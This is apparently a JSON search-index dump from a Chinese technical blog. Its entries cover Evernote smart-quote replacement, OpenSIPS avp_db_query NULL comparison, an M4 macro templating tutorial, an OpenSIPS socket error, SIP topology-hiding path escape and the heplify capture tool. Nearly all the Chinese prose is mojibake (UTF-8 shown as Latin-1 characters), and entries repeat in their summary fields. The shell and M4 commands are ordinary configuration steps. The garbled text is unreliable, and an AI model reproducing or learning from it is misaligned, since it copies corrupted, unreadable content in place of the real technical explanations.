å¿…é¡»æ˜¯ä»˜è´¹çš„äº§å“ã€‚å…è´¹çš„äº§å“ï¼Œæ˜¯æ²¡æœ‰å¯æŒç»­å‘å±•æ½œåŠ›çš„ã€‚å½“ç„¶ï¼Œä»˜è´¹éœ€è¦åœ¨æ¥å—èŒƒå›´ä¹‹å†…ã€‚ å¿…é¡»è¶³å¤Ÿç¨³å®š ç”¨æˆ·ç•Œé¢ï¼Œä½“éªŒå¿…é¡»è¶³å¤Ÿå¥½ å¿…é¡»è¦ç¦»çº¿ä½¿ç”¨ å°±ç›®å‰æ¥è¯´ï¼Œèƒ½æ»¡è¶³ä»¥ä¸Šå‡ ä¸ªè¦æ±‚çš„ï¼Œå±ˆæŒ‡å¯æ•°ã€‚\nå°è±¡ç¬”è®°è™½ç„¶æœ‰æ¶å¿ƒçš„å¹¿å‘Šæ¨é€(å³ä½¿ä¼šå‘˜ä¹Ÿæœ‰å¹¿å‘Š)ï¼Œä½†æ˜¯ä¸€èˆ¬åœ¨éç‰¹æ®Šçš„æ—¥å­ï¼Œå¹¿å‘Šä¸å›ä¸€ç›´å­˜åœ¨çš„ã€‚\nå°è±¡ç¬”è®°ä¸å¤ªæ™ºèƒ½çš„æ›¿æ¢ æŠŠè‹±æ–‡å•å¼•å·æ›¿æ¢æˆä¸­æ–‡å•å¼•å· æŠŠä¸¤ä¸ª\u0026ndash;å¤©æ¢æˆä¸€ä¸ªä¸­æ–‡ç ´æŠ˜å· ä»¥ä¸Šä¸¤ä¸ªé—®é¢˜ï¼Œåœ¨ç²˜è´´ä»£ç çš„æ—¶å€™ï¼Œæ˜¯è‡´å‘½çš„é—®é¢˜ã€‚æˆ‘æœ¬æ¥ç²˜è´´çš„æ˜¯ä¸¤ä¸ª\u0026ndash;ï¼Œç²˜è´´åˆ°å°è±¡ç¬”è®°é‡Œå±…ç„¶å˜æˆä¸€ä¸ªä¸­æ–‡ç ´æŠ˜å·ï¼Œé‚£ä¹ˆåæœŸåœ¨å¤åˆ¶å‡ºæ¥ç”¨çš„ï¼Œå¿…ç„¶å‡ºç°é—®é¢˜ã€‚\næˆ‘é—®äº†å®˜æ–¹çš„å®¢æœï¼Œå®˜æ–¹çš„å®¢æˆ·ä¹Ÿä¸çŸ¥é“æ€ä¹ˆè§£å†³ã€‚\nåæ¥æˆ‘è‡ªå·±åœ¨ç½‘ä¸Šæœç´¢ï¼Œå‘ç°äº†è§£å†³é—®é¢˜çš„æ–¹æ³•ã€‚\nä»¥ä¸Šæ‰€æœ‰çš„å…³äºæ›¿æ¢çš„é—®é¢˜ï¼Œéƒ½æ˜¯å’Œç¼–è¾‘å™¨çš„æ›¿æ¢è®¾ç½®æœ‰å…³ã€‚\næ‰“å¼€ä¸€ä¸ªç¬”è®°ï¼Œç„¶åç‚¹å‡»å³é”®\né€‰æ‹©æ›¿æ¢ï¼Œå¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰æ™ºèƒ½å¼•å·ï¼Œåªèƒ½ç ´æŠ˜å·ï¼Œæ™ºèƒ½è¿æ¥ï¼Œæ–‡æœ¬æ›¿æ¢ï¼Œå»ºè®®æŠŠè¿™å‡ ä¸ªéƒ½å–æ¶ˆå‹¾é€‰\nè¿˜æœ‰ä¸€ä¸ªå¯èƒ½æ€§ï¼Œå°±æ˜¯åœ¨**ç¼–è¾‘-\u0026gt;æ‹¼å†™å’Œè¯­æ³•-\u0026gt;è‡ªåŠ¨æ‹¼å†™çº æ­£ï¼Œ**è¿™ä¸ªè¦å…³é—­ã€‚","title":"å°è±¡ç¬”è®°ä¸å¤ªæ™ºèƒ½çš„æ™ºèƒ½æ›¿æ¢"},{"content":"avp_db_queryæ˜¯ç”¨æ¥åšæ•°æ®åº“æŸ¥è¯¢çš„ï¼Œå¦‚æœæŸ¥åˆ°æŸåˆ—çš„å€¼æ˜¯NULL, é‚£ä¹ˆå¯¹åº”åˆ°è„šæœ¬é‡Œåº”è¯¥å¦‚ä½•æ¯”è¾ƒå‘¢ï¼Ÿ\nå¯ä»¥ç”¨avpçš„å€¼ä¸\u0026quot;\u0026quot;ï¼Œ è¿›è¡Œæ¯”è¾ƒ\nif ($avp(status) == \u0026#34;\u0026lt;null\u0026gt;\u0026#34;) å‚è€ƒ https://stackoverflow.com/questions/52675803/opensips-avp-db-query-cant-compare-null-value ","permalink":"https://wdd.js.org/opensips/ch5/avp-db-query/","summary":"avp_db_queryæ˜¯ç”¨æ¥åšæ•°æ®åº“æŸ¥è¯¢çš„ï¼Œå¦‚æœæŸ¥åˆ°æŸåˆ—çš„å€¼æ˜¯NULL, é‚£ä¹ˆå¯¹åº”åˆ°è„šæœ¬é‡Œåº”è¯¥å¦‚ä½•æ¯”è¾ƒå‘¢ï¼Ÿ\nå¯ä»¥ç”¨avpçš„å€¼ä¸\u0026quot;\u0026quot;ï¼Œ è¿›è¡Œæ¯”è¾ƒ\nif ($avp(status) == \u0026#34;\u0026lt;null\u0026gt;\u0026#34;) å‚è€ƒ https://stackoverflow.com/questions/52675803/opensips-avp-db-query-cant-compare-null-value ","title":"avp_db_queryæ•°å€¼nullå€¼æ¯”è¾ƒ"},{"content":"æ–‡æœ¬å¤„ç†çš„éš¾ç‚¹ æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œæ‘˜æŠ„å…¶ä¸­ä¸¤è¡Œå†…å®¹å¦‚ä¸‹ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªé…ç½®db_addr, local_ipè¿™ä¸¤ä¸ªé…ç½®ï¼Œéœ€è¦åœ¨ä¸åŒç¯å¢ƒè¦ä¿®æ”¹çš„ã€‚\ndb_addr=1.2.3.4:3306 local_ip=192.168.2.4 ä½†æ˜¯å“ªäº›åœ°æ–¹è¦ä¿®æ”¹å‘¢ï¼Ÿä¸ºäº†æé†’åç»­çš„ç»´æŠ¤è€…ï¼Œæˆ‘ä»¬ç»™è¦ä¿®æ”¹çš„åœ°æ–¹åŠ ä¸ªå¤‡æ³¨å§ã€‚\ndb_addr=1.2.3.4:3306 # è¿™é‡Œè¦ä¿®æ”¹ local_ip=192.168.2.4 # è¿™é‡Œè¦ä¿®æ”¹ .... ... if len(a) = 1024 { # è¿™é‡Œè¦ä¿®æ”¹1024 ... } ... ç”¨sedæ›¿æ¢ï¼Ÿ è®©åˆ«äººä¸€ä¸ªä¸€ä¸ªåœ°æ–¹å»ä¿®æ”¹ï¼Œä¹Ÿå¤ªéº»çƒ¦äº†ï¼Œæœ‰æ²¡æœ‰å¯èƒ½ç”¨è„šæœ¬å»å¤„ç†å‘¢ï¼Ÿä¾‹å¦‚æˆ‘ä»¬ç”¨DB_ADDRå’ŒLOCAL_IPè¿™ç§å­—ç¬¦ä¸²ä½œä¸ºå ä½ç¬¦ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”¨sedä¹‹ç±»çš„å‘½ä»¤å»åšæ›¿æ¢äº†ã€‚\ndb_addr=DB_ADDR local_ip=LOCAL_IP sed -i \u0026#39;s/DB_ADDR/1.2.3.4:3306/g;s/LOCAL_IP/192.168.0.1/g\u0026#39; 1.cfg è¿™æ ·åšæ˜¯æœ‰ç‚¹æ–¹ä¾¿äº†ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä»¥ä¸‹å‡ ä¸ªé—®é¢˜\nå¦‚æœå®šä¹‰çš„å ä½ç¬¦å¤ªå¤šï¼Œsedä¼šå˜å¾—è¶Šæ¥è¶Šé•¿ å¦‚æœæŸäº›å ä½ç¬¦é‡Œæœ¬èº«å°±å«æœ‰/æˆ–è€…ä¸€äº›ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼Œå°±éœ€è¦åšç‰¹æ®Šå¤„ç†äº† ç”¨M4å§ï¼Œä¸“ä¸šçš„äººåšä¸“ä¸šçš„äº‹æƒ… apt-get install m4 é€šè¿‡å‘½ä»¤è¡Œå®šä¹‰å® 1.m4\ndb_addr=DB_ADDR local_ip=LOCAL_IP .... ... if len(a) = MAX_LEN { ... } ... M4å¯ä»¥ä½¿ç”¨-Dæ¥å®šä¹‰å®å’Œå®å¯¹åº”çš„å€¼ï¼Œé»˜è®¤è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨\u0026gt;å°†è¾“å‡ºå†™åˆ°æ–‡ä»¶ä¸­\nm4 -D DB_ADDR=1.2.3.4:3306 -D LOCAL_IP=192.168.2.2 -D MAX_LEN=2048 1.m4 db_addr=1.2.3.4:3306 local_ip=192.168.2.2 .... ... if 1 = 2048 { ... } ... ç”¨defineè¯­å¥å®šä¹‰å® ç”¨define()è¯­å¥æ¥å®šä¹‰å® ç”¨`\u0026lsquo;æ¥ä½œä¸ºå­—ç¬¦ä¸²å¼•ç”¨ï¼Œé¿å…è¢«å±•å¼€ define(`DB_ADDR\u0026#39;, `1.2.3.4:3306\u0026#39;) define(`LOCAL_IP\u0026#39;, `192.168.2.2\u0026#39;) define(`MAX_LEN\u0026#39;, `2048\u0026#39;) db_addr=DB_ADDR local_ip=LOCAL_IP .... ... if len(a) = MAX_LEN { ... } ... æ‰§è¡Œå‘½ä»¤m4 1.m4, å¯ä»¥çœ‹åˆ°å®å±•å¼€ï¼Œä½†æ˜¯æœ‰å¾ˆå¤šç©ºè¡Œã€‚\ndb_addr=1.2.3.4:3306 local_ip=192.168.2.2 .... ... if 1 = 2048 { ... } ...% ç”¨dnlé¿å…äº§ç”Ÿç©ºè¡Œ åœ¨defineè¯­å¥çš„æœ«å°¾ï¼ŒåŠ ä¸Šdnl\ndefine(`DB_ADDR\u0026#39;, `1.2.3.4:3306\u0026#39;)dnl define(`LOCAL_IP\u0026#39;, `192.168.2.2\u0026#39;)dnl define(`MAX_LEN\u0026#39;, `2048\u0026#39;)dnl db_addr=DB_ADDR local_ip=LOCAL_IP .... ... if len(a) = MAX_LEN { ... } ... æ‰§è¡Œm4 1.m4 å¯ä»¥çœ‹åˆ°ï¼Œç©ºè¡Œæ²¡äº†\ndb_addr=1.2.3.4:3306 local_ip=192.168.2.2 .... ... if 1 = 2048 { ... } ... æŠ½ç¦»å‡ºå®é…ç½®æ–‡ä»¶ å°†1.m4åˆ†æˆä¸¤ä¸ªæ–‡ä»¶1.m4, 1.conf\n1.conf\ndivert(-1) define(`DB_ADDR\u0026#39;, `1.2.3.4:3306\u0026#39;) define(`LOCAL_IP\u0026#39;, `192.168.2.2\u0026#39;) define(`MAX_LEN\u0026#39;, `2048\u0026#39;) divert(0) 1.m4\ndb_addr=DB_ADDR local_ip=LOCAL_IP .... ... if len(a) = MAX_LEN { ... } ... æ‰§è¡Œï¼šm4 1.conf 1.m4\ndb_addr=1.2.3.4:3306 local_ip=192.168.2.2 .... ... if 1 = 2048 { ... } ... è¯»å–ç¯å¢ƒå˜é‡ define(`MY_NAME\u0026#39;, `esyscmd(`printf \u0026#34;${MY_NAME:-wdd}\u0026#34;\u0026#39;)\u0026#39;)dnl ","permalink":"https://wdd.js.org/posts/2021/09/","summary":"æ–‡æœ¬å¤„ç†çš„éš¾ç‚¹ æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼Œæ‘˜æŠ„å…¶ä¸­ä¸¤è¡Œå†…å®¹å¦‚ä¸‹ï¼Œé‡Œé¢æœ‰ä¸¤ä¸ªé…ç½®db_addr, local_ipè¿™ä¸¤ä¸ªé…ç½®ï¼Œéœ€è¦åœ¨ä¸åŒç¯å¢ƒè¦ä¿®æ”¹çš„ã€‚\ndb_addr=1.2.3.4:3306 local_ip=192.168.2.4 ä½†æ˜¯å“ªäº›åœ°æ–¹è¦ä¿®æ”¹å‘¢ï¼Ÿä¸ºäº†æé†’åç»­çš„ç»´æŠ¤è€…ï¼Œæˆ‘ä»¬ç»™è¦ä¿®æ”¹çš„åœ°æ–¹åŠ ä¸ªå¤‡æ³¨å§ã€‚\ndb_addr=1.2.3.4:3306 # è¿™é‡Œè¦ä¿®æ”¹ local_ip=192.168.2.4 # è¿™é‡Œè¦ä¿®æ”¹ .... ... if len(a) = 1024 { # è¿™é‡Œè¦ä¿®æ”¹1024 ... } ... ç”¨sedæ›¿æ¢ï¼Ÿ è®©åˆ«äººä¸€ä¸ªä¸€ä¸ªåœ°æ–¹å»ä¿®æ”¹ï¼Œä¹Ÿå¤ªéº»çƒ¦äº†ï¼Œæœ‰æ²¡æœ‰å¯èƒ½ç”¨è„šæœ¬å»å¤„ç†å‘¢ï¼Ÿä¾‹å¦‚æˆ‘ä»¬ç”¨DB_ADDRå’ŒLOCAL_IPè¿™ç§å­—ç¬¦ä¸²ä½œä¸ºå ä½ç¬¦ï¼Œç„¶åæˆ‘ä»¬å°±å¯ä»¥ç”¨sedä¹‹ç±»çš„å‘½ä»¤å»åšæ›¿æ¢äº†ã€‚\ndb_addr=DB_ADDR local_ip=LOCAL_IP sed -i \u0026#39;s/DB_ADDR/1.2.3.4:3306/g;s/LOCAL_IP/192.168.0.1/g\u0026#39; 1.cfg è¿™æ ·åšæ˜¯æœ‰ç‚¹æ–¹ä¾¿äº†ï¼Œä½†æ˜¯ä¹Ÿæœ‰ä»¥ä¸‹å‡ ä¸ªé—®é¢˜\nå¦‚æœå®šä¹‰çš„å ä½ç¬¦å¤ªå¤šï¼Œsedä¼šå˜å¾—è¶Šæ¥è¶Šé•¿ å¦‚æœæŸäº›å ä½ç¬¦é‡Œæœ¬èº«å°±å«æœ‰/æˆ–è€…ä¸€äº›ç‰¹æ®Šå«ä¹‰çš„å­—ç¬¦ï¼Œå°±éœ€è¦åšç‰¹æ®Šå¤„ç†äº† ç”¨M4å§ï¼Œä¸“ä¸šçš„äººåšä¸“ä¸šçš„äº‹æƒ… apt-get install m4 é€šè¿‡å‘½ä»¤è¡Œå®šä¹‰å® 1.m4\ndb_addr=DB_ADDR local_ip=LOCAL_IP .... ... if len(a) = MAX_LEN { ... } ... M4å¯ä»¥ä½¿ç”¨-Dæ¥å®šä¹‰å®å’Œå®å¯¹åº”çš„å€¼ï¼Œé»˜è®¤è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨\u0026gt;å°†è¾“å‡ºå†™åˆ°æ–‡ä»¶ä¸­\nm4 -D DB_ADDR=1.2.3.4:3306 -D LOCAL_IP=192.168.2.2 -D MAX_LEN=2048 1.m4 db_addr=1.2.3.4:3306 local_ip=192.168.2.2 .... ... if 1 = 2048 { .","title":"ç®€å•å®ç”¨çš„M4æ•™ç¨‹"},{"content":"ERROR:core:tcp_init_listener: could not get TCP protocol number CRITICAL:core:send_fd: sendmsg failed on 0: Socket operation on non-socket ERROR:core:send2child: send_fd failed ä¸è¦å°†tcp_childè®¾ç½®ä¸º0\n","permalink":"https://wdd.js.org/opensips/ch7/sendmsg-failed/","summary":"ERROR:core:tcp_init_listener: could not get TCP protocol number CRITICAL:core:send_fd: sendmsg failed on 0: Socket operation on non-socket ERROR:core:send2child: send_fd failed ä¸è¦å°†tcp_childè®¾ç½®ä¸º0","title":"sendmsg failed on 0: Socket operation on non-socket"},{"content":"é—®é¢˜è¡¨ç° åœ¨ç»è¿‡åˆå§‹åŒ–è¯·æ±‚ä¹‹åï¼Œè·¯å¾„å‘ç°å®Œæˆã€‚åœ¨è¿™ä¸ªdialogä¸­æ‰€æœ‰çš„è¯·æ±‚ï¼Œæ­£å¸¸æ¥ua1å’Œua2ä¹‹é—´çš„æ‰€æœ‰è¯·æ±‚ï¼Œéƒ½åº”è¯¥ç»è¿‡us1å’Œus2ã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næŸäº›æ—¶å€™ï¼Œua1å¯èƒ½ç›´æ¥æŠŠBYEæ¶ˆæ¯ç›´æ¥å‘é€ç»™ua2, ä½†æ˜¯ä¸€èˆ¬ua1å’Œua2æ˜¯å­˜åœ¨uatç½‘ç»œçš„ï¼Œæ‰€ä»¥è¿™ä¸ªBYEæ¶ˆæ¯ï¼Œua2å¾ˆå¯èƒ½æ”¶ä¸åˆ°ã€‚\né—®é¢˜çš„è¡¨ç°å°±æ˜¯ç”µè¯æ— æ³•æ­£å¸¸æŒ‚æ–­ã€‚\né—®é¢˜åˆ†æ å¯èƒ½åŸå› 1: us1å’Œus2æ²¡æœ‰åšrecord-route, å¯¼è‡´è¯·æ±‚ç›´æ¥æ ¹æ®æŸä¸ªè¯·æ±‚çš„å“åº”æ¶ˆæ¯çš„Contactå¤´ï¼Œç›´æ¥å‘é€äº†ã€‚ å¯èƒ½åŸå› 2: æŸäº›è¯·æ±‚çš„æ‹“æ‰‘éšè—æ²¡æœ‰åšå¥½ æ‹“æ‰‘éšè—é—®é¢˜å…·ä½“åˆ†æ å‡å¦‚æˆ‘ä»¬åœ¨us1ä¸Šæ­£ç¡®çš„åšäº†æ‹“æ‰‘éšè—ï¼Œé‚£ä¹ˆua1çš„æ‰€æœ‰æ”¶åˆ°çš„å“åº”ï¼Œå®ƒçš„Contactå¤´çš„åœ°å€éƒ½ä¼šæ”¹æˆus1çš„åœ°å€ã€‚é‚£ä¹ˆua1æ˜¯æ— è®ºå¦‚ä½•éƒ½è·å–ä¸åˆ°ua2çš„ç›´æ¥åœ°å€çš„ã€‚\nä½†æ˜¯ï¼Œå‡å¦‚æŸä¸ªæ¶ˆæ¯å¤„ç†çš„ä¸å¯¹å‘¢ï¼Ÿ\næ³¨æ„180å“åº”5åˆ°6, å…¶ä¸­us1æ­£ç¡®çš„ä¿®æ”¹äº†Contactå¤´ ua1æ”¶åˆ°180åï¼Œç«‹å³å‘é€äº†notifyæ¶ˆæ¯ å¦‚æœus1æ²¡æœ‰æ­£ç¡®å¤„ç†notifyçš„å“åº”çš„Contactå¤´ï¼Œus1å°±ä¼šæŠŠua2çš„Contactä¿¡æ¯å‘é€ç»™ua1ã€‚æœ‰äº›notifyçš„å“åº”å¸¦æœ‰Contactå¤´ï¼Œæœ‰äº›æ²¡å¸¦æœ‰ã€‚ ä½†æ˜¯è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªç«äº‰æ¡ä»¶ï¼Œinviteçš„200okå’Œnotifyçš„200okï¼Œæ¶ˆæ¯åˆ°è¾¾çš„é¡ºåºï¼Œå°†å½±å“ua2çš„Contactä¿¡æ¯ å¦‚æœua1åæ”¶åˆ°inviteçš„200ok, æ­¤æ—¶ua1è·å–ua2çš„åœ°å€æ˜¯us1 å¦‚æœua2åæ”¶åˆ°notifyçš„200ok, æ­¤æ—¶ua2è·å–çš„ua2çš„åœ°å€å°±æ˜¯ua2 æ‰€ä»¥é—®é¢˜çš„è¡¨ç°å¯èƒ½æ˜¯æœ‰å¶ç°çš„ï¼Œè¿™ç§é—®é¢˜å¤„ç†å…¶å®æ˜¯æ¯”è¾ƒæ£˜æ‰‹çš„ å½“ç„¶ä¹Ÿæ˜¯æœ‰è§£å†³æ–¹æ¡ˆçš„ æ–¹æ¡ˆ1ï¼Œ us1å¯¹notifyæ­£ç¡®å¤„ç†å“åº”æ¶ˆæ¯Contact, å°†å…¶ä¿®æ”¹æˆus1 æ–¹æ¡ˆ2ï¼Œus1ç›´æ¥åˆ é™¤notifyå“åº”æ¶ˆæ¯çš„Contactå¤´ ","permalink":"https://wdd.js.org/opensips/ch7/escape-msg/","summary":"é—®é¢˜è¡¨ç° åœ¨ç»è¿‡åˆå§‹åŒ–è¯·æ±‚ä¹‹åï¼Œè·¯å¾„å‘ç°å®Œæˆã€‚åœ¨è¿™ä¸ªdialogä¸­æ‰€æœ‰çš„è¯·æ±‚ï¼Œæ­£å¸¸æ¥ua1å’Œua2ä¹‹é—´çš„æ‰€æœ‰è¯·æ±‚ï¼Œéƒ½åº”è¯¥ç»è¿‡us1å’Œus2ã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\næŸäº›æ—¶å€™ï¼Œua1å¯èƒ½ç›´æ¥æŠŠBYEæ¶ˆæ¯ç›´æ¥å‘é€ç»™ua2, ä½†æ˜¯ä¸€èˆ¬ua1å’Œua2æ˜¯å­˜åœ¨uatç½‘ç»œçš„ï¼Œæ‰€ä»¥è¿™ä¸ªBYEæ¶ˆæ¯ï¼Œua2å¾ˆå¯èƒ½æ”¶ä¸åˆ°ã€‚\né—®é¢˜çš„è¡¨ç°å°±æ˜¯ç”µè¯æ— æ³•æ­£å¸¸æŒ‚æ–­ã€‚\né—®é¢˜åˆ†æ å¯èƒ½åŸå› 1: us1å’Œus2æ²¡æœ‰åšrecord-route, å¯¼è‡´è¯·æ±‚ç›´æ¥æ ¹æ®æŸä¸ªè¯·æ±‚çš„å“åº”æ¶ˆæ¯çš„Contactå¤´ï¼Œç›´æ¥å‘é€äº†ã€‚ å¯èƒ½åŸå› 2: æŸäº›è¯·æ±‚çš„æ‹“æ‰‘éšè—æ²¡æœ‰åšå¥½ æ‹“æ‰‘éšè—é—®é¢˜å…·ä½“åˆ†æ å‡å¦‚æˆ‘ä»¬åœ¨us1ä¸Šæ­£ç¡®çš„åšäº†æ‹“æ‰‘éšè—ï¼Œé‚£ä¹ˆua1çš„æ‰€æœ‰æ”¶åˆ°çš„å“åº”ï¼Œå®ƒçš„Contactå¤´çš„åœ°å€éƒ½ä¼šæ”¹æˆus1çš„åœ°å€ã€‚é‚£ä¹ˆua1æ˜¯æ— è®ºå¦‚ä½•éƒ½è·å–ä¸åˆ°ua2çš„ç›´æ¥åœ°å€çš„ã€‚\nä½†æ˜¯ï¼Œå‡å¦‚æŸä¸ªæ¶ˆæ¯å¤„ç†çš„ä¸å¯¹å‘¢ï¼Ÿ\næ³¨æ„180å“åº”5åˆ°6, å…¶ä¸­us1æ­£ç¡®çš„ä¿®æ”¹äº†Contactå¤´ ua1æ”¶åˆ°180åï¼Œç«‹å³å‘é€äº†notifyæ¶ˆæ¯ å¦‚æœus1æ²¡æœ‰æ­£ç¡®å¤„ç†notifyçš„å“åº”çš„Contactå¤´ï¼Œus1å°±ä¼šæŠŠua2çš„Contactä¿¡æ¯å‘é€ç»™ua1ã€‚æœ‰äº›notifyçš„å“åº”å¸¦æœ‰Contactå¤´ï¼Œæœ‰äº›æ²¡å¸¦æœ‰ã€‚ ä½†æ˜¯è¿™é‡Œä¼šå‡ºç°ä¸€ä¸ªç«äº‰æ¡ä»¶ï¼Œinviteçš„200okå’Œnotifyçš„200okï¼Œæ¶ˆæ¯åˆ°è¾¾çš„é¡ºåºï¼Œå°†å½±å“ua2çš„Contactä¿¡æ¯ å¦‚æœua1åæ”¶åˆ°inviteçš„200ok, æ­¤æ—¶ua1è·å–ua2çš„åœ°å€æ˜¯us1 å¦‚æœua2åæ”¶åˆ°notifyçš„200ok, æ­¤æ—¶ua2è·å–çš„ua2çš„åœ°å€å°±æ˜¯ua2 æ‰€ä»¥é—®é¢˜çš„è¡¨ç°å¯èƒ½æ˜¯æœ‰å¶ç°çš„ï¼Œè¿™ç§é—®é¢˜å¤„ç†å…¶å®æ˜¯æ¯”è¾ƒæ£˜æ‰‹çš„ å½“ç„¶ä¹Ÿæ˜¯æœ‰è§£å†³æ–¹æ¡ˆçš„ æ–¹æ¡ˆ1ï¼Œ us1å¯¹notifyæ­£ç¡®å¤„ç†å“åº”æ¶ˆæ¯Contact, å°†å…¶ä¿®æ”¹æˆus1 æ–¹æ¡ˆ2ï¼Œus1ç›´æ¥åˆ é™¤notifyå“åº”æ¶ˆæ¯çš„Contactå¤´ ","title":"ä¿¡ä»¤è·¯å¾„é€ƒé€¸åˆ†æ"},{"content":"hepfilyæ˜¯ä¸ªç‹¬ç«‹çš„æŠ“åŒ…ç¨‹åºï¼Œç±»ä¼¼äºtcpdumpä¹‹ç±»çš„ï¼Œç½‘ç»œæŠ“åŒ…ç¨‹åºï¼Œå¯ä»¥æŠŠæŠ“åˆ°çš„sipåŒ…ï¼Œç¼–ç ä¸ºhepæ ¼å¼ã€‚ç„¶åé€åˆ°hep serverä¸Šï¼Œç”±hepserverè´Ÿè´£åŒ…çš„æ•´ç†å’Œå­˜å‚¨ã€‚\nheplifyå®‰è£…éå¸¸ç®€å•ï¼Œåœ¨ä»“åº“çš„releaseé¡µé¢ï¼Œå¯ä»¥ä¸‹è½½äºŒè¿›ç¨‹ç¨‹åºã€‚äºŒè¿›ç¨‹ç¨‹åºèµ‹äºˆå¯æ‰§è¡Œæƒé™åï¼Œå¯ä»¥ç›´æ¥åœ¨x86æ¶æ„çš„æœºå™¨ä¸Šè¿è¡Œã€‚\nå› ä¸ºheplifyæ˜¯goè¯­è¨€å†™çš„ï¼Œä½ ä¹Ÿå¯ä»¥åŸºäºæºç ï¼Œç¼–è¯‘å…¶ä»–æ¶æ„çš„äºŒè¿›åˆ¶ç¨‹åºã€‚\nhttps://github.com/sipcapture/heplify\n-i è®¾å®šæŠ“åŒ…çš„ç½‘å¡ -m è®¾ç½®æŠ“åŒ…æ¨¡å¼ä¸ºSIP -hs è®¾ç½®hep serverçš„åœ°å€ -p è®¾ç½®æ—¥å¿—æ–‡ä»¶çš„æ—¥å¿— -dim è®¾ç½®è¿‡æ»¤ä¸€äº›ä¸å…³å¿ƒçš„sipåŒ… -pr è®¾ç½®æŠ“åŒ…çš„ç«¯å£èŒƒå›´ nohup ./heplify \\ -i eno1 \\ -m SIP \\ -hs 192.168.1.2:9060 \\ -p \u0026#34;/var/log/\u0026#34; \\ -dim OPTIONS,REGISTER \\ -pr \u0026#34;18627-18628\u0026#34; \u0026amp; opensipsæ¨¡å—æœ¬èº«å°±æœ‰proto_hepæ¨¡å—æ”¯æŒhepæŠ“åŒ…ï¼Œä¸ºä»€ä¹ˆæˆ‘è¿˜è¦ç”¨heplifyæ¥æŠ“åŒ…å‘¢ï¼Ÿ\nä½äº2.2ç‰ˆæœ¬çš„opensipsä¸æ”¯æŒhepæŠ“åŒ… opensipsçš„hepæŠ“åŒ…è¿˜æ˜¯ä¸å¤ªç¨³å®šã€‚æˆ‘æ›¾é‡åˆ°è¿‡å› ä¸ºhepæŠ“åŒ…å¯¼è‡´opensipså´©æºƒçš„äº‹æ•…ã€‚å¦‚æœç”¨å¤–éƒ¨çš„æŠ“åŒ…ç¨‹åºï¼Œå³ä½¿æŠ“åŒ…æœ‰é—®é¢˜ï¼Œè¿˜æ˜¯ä¸ä¼šå½±å“åˆ°opensipsã€‚ ","permalink":"https://wdd.js.org/opensips/tools/heplify/","summary":"hepfilyæ˜¯ä¸ªç‹¬ç«‹çš„æŠ“åŒ…ç¨‹åºï¼Œç±»ä¼¼äºtcpdumpä¹‹ç±»çš„ï¼Œç½‘ç»œæŠ“åŒ…ç¨‹åºï¼Œå¯ä»¥æŠŠæŠ“åˆ°çš„sipåŒ…ï¼Œç¼–ç ä¸ºhepæ ¼å¼ã€‚ç„¶åé€åˆ°hep serverä¸Šï¼Œç”±hepserverè´Ÿè´£åŒ…çš„æ•´ç†å’Œå­˜å‚¨ã€‚\nheplifyå®‰è£…éå¸¸ç®€å•ï¼Œåœ¨ä»“åº“çš„releaseé¡µé¢ï¼Œå¯ä»¥ä¸‹è½½äºŒè¿›ç¨‹ç¨‹åºã€‚äºŒè¿›ç¨‹ç¨‹åºèµ‹äºˆå¯æ‰§è¡Œæƒé™åï¼Œå¯ä»¥ç›´æ¥åœ¨x86æ¶æ„çš„æœºå™¨ä¸Šè¿è¡Œã€‚\nå› ä¸ºheplifyæ˜¯goè¯­è¨€å†™çš„ï¼Œä½ ä¹Ÿå¯ä»¥åŸºäºæºç ï¼Œç¼–è¯‘å…¶ä»–æ¶æ„çš„äºŒè¿›åˆ¶ç¨‹åºã€‚\nhttps://github.com/sipcapture/heplify\n-i è®¾å®šæŠ“åŒ…çš„ç½‘å¡ -m è®¾ç½®æŠ“åŒ…æ¨¡å¼ä¸ºSIP -hs è®¾ç½®hep serverçš„åœ°å€ -p è®¾ç½®æ—¥å¿—æ–‡ä»¶çš„æ—¥å¿— -dim è®¾ç½®è¿‡æ»¤ä¸€äº›ä¸å…³å¿ƒçš„sipåŒ… -pr è®¾ç½®æŠ“åŒ…çš„ç«¯å£èŒƒå›´ nohup ./heplify \\ -i eno1 \\ -m SIP \\ -hs 192.168.1.2:9060 \\ -p \u0026#34;/var/log/\u0026#34; \\ -dim OPTIONS,REGISTER \\ -pr \u0026#34;18627-18628\u0026#34; \u0026amp; opensipsæ¨¡å—æœ¬èº«å°±æœ‰proto_hepæ¨¡å—æ”¯æŒhepæŠ“åŒ…ï¼Œä¸ºä»€ä¹ˆæˆ‘è¿˜è¦ç”¨heplifyæ¥æŠ“åŒ…å‘¢ï¼Ÿ\nä½äº2.2ç‰ˆæœ¬çš„opensipsä¸æ”¯æŒhepæŠ“åŒ… opensipsçš„hepæŠ“åŒ…è¿˜æ˜¯ä¸å¤ªç¨³å®šã€‚æˆ‘æ›¾é‡åˆ°è¿‡å› ä¸ºhepæŠ“åŒ…å¯¼è‡´opensipså´©æºƒçš„äº‹æ•…ã€‚å¦‚æœç”¨å¤–éƒ¨çš„æŠ“åŒ…ç¨‹åºï¼Œå³ä½¿æŠ“åŒ…æœ‰é—®é¢˜ï¼Œè¿˜æ˜¯ä¸ä¼šå½±å“åˆ°opensipsã€‚ ","title":"heplify SIPä¿¡ä»¤æŠ“åŒ…å®¢æˆ·ç«¯"},{"content":"ç®€ä»‹ OpenSIPSçš„è·¯ç”±è„šæœ¬æä¾›äº†å‡ ç§ä¸åŒç±»å‹çš„å˜é‡ã€‚ä¸åŒç±»å‹çš„å˜é‡æœ‰ä»¥ä¸‹å‡ ä¸ªæ–¹é¢çš„å·®å¼‚ã€‚\nå˜é‡çš„å¯è§æ€§ å˜é‡å¼•ç”¨çš„å€¼ 